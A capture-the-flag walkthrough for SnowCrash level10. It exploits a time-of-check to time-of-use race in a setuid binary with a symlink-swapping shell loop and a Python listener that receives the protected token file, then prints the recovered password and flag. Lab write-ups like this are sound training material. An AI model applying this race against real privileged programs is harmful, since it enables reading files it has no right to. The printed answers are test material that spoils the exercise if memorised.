# SnowCrash

## Level10

```sh
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

```sh
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
```
Looks like the program is supposed to send the file to a specific host, let's try to send the token to localhost
```sh
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```
Right issues... We create a file to have full access on it and try again
```sh
level10@SnowCrash:~$ touch /tmp/exploit
level10@SnowCrash:~$ ./level10 /tmp/exploit localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```

Looks like we need to open a server on localhost:6969
```py
import SocketServer

class MyTCPHandler(SocketServer.StreamRequestHandler):
    def handle(self):
        print "Connection from:", self.client_address
        while True:
            data = self.rfile.read(64)
            if not data:
                break
            print "Received:", data

if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 6969
    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
    print "Server listening on {}:{}".format(HOST, PORT)
    server.serve_forever()
```
```sh
(gdb) disas main
Dump of assembler code for function main:
	...
   0x08048749 <+117>:   call   0x80485e0 <access@plt>
   0x0804874e <+122>:   test   %eax,%eax
	...
	...
	...
   0x0804889b <+455>:   call   0x80485a0 <open@plt>
    ...
End of assembler dump.
```

Access checks for user's permissions for a file
When trying to change it's return value by using gdb and setting $eax=0, we still get an error
```sh
(gdb) b *0x0804874e
Breakpoint 1 at 0x804874e: file level10.c, line 24.
(gdb) run token 0.0.0.0
Starting program: /home/user/level10/level10 token 0.0.0.0

Breakpoint 1, 0x0804874e in main (argc=3, argv=0xbffff7c4) at level10.c:24
24      level10.c: No such file or directory.
(gdb) set $eax=0
(gdb) continue
Continuing.
Connecting to 0.0.0.0:6969 .. Connected!
Sending file .. Damn. Unable to open file
```
The trick worked on Access but we got blocked by Open this time, we could use the same trick but it would be more complicated this time.

Let's try something else.

On the Access man page we can see this:
```sh
Notes
Warning: Using access() to check if a user is authorized to, for example, 
open a file before actually doing so using open(2) creates a security hole,
because the user might exploit the short time interval between checking and opening the file to manipulate it.

For this reason, the use of this system call should be avoided.
(In the example just described, a safer alternative would be to temporarily switch 
the process's effective user ID to the real ID and then call open(2).)
```
This exploit is called TOCTOU (time-of-check to time-of-use), let's create a script to realize it

```sh
level10@SnowCrash:/tmp$ echo toctou > /tmp/toctou

level10@SnowCrash:/tmp$ cat toctou.sh
while true; do
        ln -sf /home/user/level10/token /tmp/exploit
        ln -sf /tmp/toctou /tmp/exploit
done
```

This script will switch the symlink between the token file (no access) and our toctou file (with access)
We now need to run the script and keep launching the program with:

```sh
./level10 /tmp/exploit 0.0.0.0
```

Until the race condition is met and we can actually get access and open the token file

```sh
Connection from: ('127.0.0.1', 50620)
Received: .*( )*.
toctou

Connection from: ('127.0.0.1', 50621)
Received: .*( )*.
toctou

Connection from: ('127.0.0.1', 50622)
Received: .*( )*.
woupa2yuojeeaaed06riuj63c
```

```sh
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```